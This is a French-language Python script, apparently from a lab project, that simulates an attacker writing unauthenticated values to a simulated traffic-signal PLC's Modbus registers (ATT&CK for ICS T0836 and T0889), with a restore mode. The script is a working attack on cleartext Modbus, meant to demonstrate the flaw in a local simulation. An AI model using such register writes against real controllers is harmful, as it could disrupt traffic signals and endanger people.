"""
*** CECI EST L'ATTAQUE ***

Simule RapidGo (l'acteur malveillant) qui ecrit directement dans les
registres Modbus du PLC, SANS authentification -- exploitant exactement la
vulnerabilite decrite dans la proposition de projet (protocole Modbus en
texte clair, absence d'authentification). Ce script peut etre lance
n'importe quand, pendant que plc_server.py et bridge_modbus_traci.py
tournent deja : le changement sera applique EN DIRECT a la simulation.

C'est aussi le moment ideal pour lancer une capture Wireshark en parallele
(filtre "tcp.port == 5020") -- vous verrez les valeurs ecrites circuler en
texte clair sur le reseau, sans aucun chiffrement ni authentification.

Usage (dans PowerShell, venv active, depuis le dossier sumo_network,
PENDANT que plc_server.py et bridge_modbus_traci.py tournent) :
    python attacker_client.py param     (pour l'experience T0836)
    python attacker_client.py program   (pour l'experience T0889, approxime
                                          ici par des durees tres extremes,
                                          puisque Modbus ne transporte que
                                          des valeurs numeriques -- voir note
                                          plus bas)
"""

import sys
from pymodbus.client import ModbusTcpClient

MODBUS_HOST = "127.0.0.1"
MODBUS_PORT = 5020

# [J1_corridor, J1_autreA, J1_autreB, J2_corridor, J2_autre]
BASELINE_VALUES = [27, 27, 27, 42, 42]
ATTACK_PARAM_VALUES = [55, 12, 12, 70, 18]       # T0836 : ajustement des parametres
ATTACK_PROGRAM_VALUES = [90, 3, 3, 110, 5]       # T0889 : alteration beaucoup plus agressive,
                                                   # qui revient quasiment a retirer le temps de
                                                   # vert des mouvements transversaux


def write_values(client, values):
    # Le nom du parametre d'identifiant d'esclave Modbus a change selon les
    # versions de pymodbus ("slave" -> "device_id" dans les versions
    # recentes). On essaie les deux pour rester compatible.
    # Meme note d'adressage que dans bridge_modbus_traci.py : lecture/ecriture
    # a l'adresse 0 (convention Modbus PDU standard), meme si le serveur a
    # ete cree avec une adresse de depart "humaine" de 1.
    try:
        result = client.write_registers(address=0, values=values, device_id=1)
    except TypeError:
        result = client.write_registers(address=0, values=values, slave=1)

    if result.isError():
        print(f"Erreur d'ecriture Modbus : {result}")
        return False
    return True


def main():
    if len(sys.argv) != 2 or sys.argv[1] not in ("param", "program", "restore"):
        print("Usage : python attacker_client.py [param|program|restore]")
        sys.exit(1)

    mode = sys.argv[1]
    values = {
        "param": ATTACK_PARAM_VALUES,
        "program": ATTACK_PROGRAM_VALUES,
        "restore": BASELINE_VALUES,
    }[mode]

    client = ModbusTcpClient(MODBUS_HOST, port=MODBUS_PORT)
    if not client.connect():
        sys.exit(f"Impossible de se connecter au PLC sur {MODBUS_HOST}:{MODBUS_PORT}. "
                  f"Le serveur (plc_server.py) tourne-t-il ?")

    print(f"*** ATTAQUE : ecriture des nouvelles valeurs ({mode}) : {values} ***")
    ok = write_values(client, values)
    if ok:
        print("Ecriture reussie. Le pont (bridge_modbus_traci.py) va appliquer "
              "ces valeurs a la prochaine lecture periodique.")
    client.close()


if __name__ == "__main__":
    main()